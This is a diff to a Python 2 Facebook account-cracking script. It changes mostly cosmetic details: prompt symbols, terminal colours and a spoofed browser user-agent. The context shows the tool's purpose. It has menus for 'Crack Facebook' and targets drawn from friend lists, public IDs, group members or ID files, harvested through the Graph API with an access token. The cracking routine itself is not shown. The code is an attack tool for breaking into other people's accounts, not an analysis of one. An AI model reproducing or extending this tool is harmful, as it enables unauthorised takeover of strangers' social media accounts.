@@ -8,6 +8,7 @@ try:
     from requests.exceptions import ConnectionError
     from mechanize import Browser
 except ImportError:
+    os.system('clear')
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
     time.sleep(1)
@@ -19,7 +20,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3')]
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) wpif Safari/537.21')]
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/FBIOS;FBAV/66.0.0.42.70;FBBV/40764466;FBRV/0;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/Verizon;FBID/phone;FBLC/en_US;FBOP/5]')]
@@ -105,11 +106,11 @@ vuln = "\033[32mVuln"
 def masuk():
     os.system('clear')
     print logo
-    print ("[1] Login With Email/Number and Password")
+    print ("\xb1[1;97m[1] Login With Email/Number and Password")
     print ("[2] Login With Access Token")
     print ("[0] Back")
     print
-    msuk = raw_input('⋐≿⋩≿☞ : ')
+    msuk = raw_input('⌯⌯⌯⌯⌯⋙: ')
     if msuk == '':
         print ("[!] Fill in Correctly")
         masuk()
@@ -156,7 +157,7 @@ def login():
         print logo
         print('          [+] LOGIN WITH FACEBOOK [+]')
         id = raw_input('[+] ID/Email : ')
-        pwd = raw_input('[+] Password = ')
+        pwd = raw_input('[+] Password : ')
         tik()
         try:
             br.open('https://mbasic.facebook.com')
@@ -230,10 +231,10 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
+	print "\033[1;97m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m                  "
+	print "\033[1;97m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print 42*"\033[1;97m="
 	print "[1] Crack Facebook"
 	print "[2] See Groups List"
 	print "[3] Information Facebook"
@@ -243,7 +244,7 @@ def menu():
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97m⋐≿⋩≿☞ \033[1;97m")
+	unikers = raw_input("\n\033[1;97m⌯⌯⌯⌯⌯⋙ \033[1;97m")
 	if unikers =="":
 		print ("[!] Fill in Correctly")
 		pilih()
@@ -277,7 +278,7 @@ def super():
 		keluar()
 	os.system('clear')
 	print logo
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
 	print "[1] Crack With Friendlist"
 	print "[2] Crack With Public ID"
 	print "[3] Crack With Group Member"
@@ -286,14 +287,14 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97m⋐≿⋩≿☞ \033[1;97m")
+	peak = raw_input("\n\033[1;97m⌯⌯⌯⌯⌯⋙ \033[1;97m")
 	if peak =="":
 		print "\033[1;96m[!] \x1b[1;91mSelect Correct"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		jalan('\033[1;96m[✺] \033[1;94mGetting IDz \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -302,7 +303,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		idt = raw_input("\033[1;96m[+] \033[1;95mEnter Target ID/Email \033[1;91m:\033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -320,7 +321,7 @@ def pilih_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		idg=raw_input('\033[1;96m[+] \033[1;93mEnter Group ID \033[1;91m:\033[1;97m ')
 		try:
 			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
@@ -338,7 +339,7 @@ def pilih_super():
 	elif peak =="4":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		try:
 			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File txt  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
@@ -359,7 +360,7 @@ def pilih_super():
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;96mCarcking Start\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[1;96mTo Stop The Process Prexx CTRL+Z 👍')
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
 	
 			
 	def main(arg):
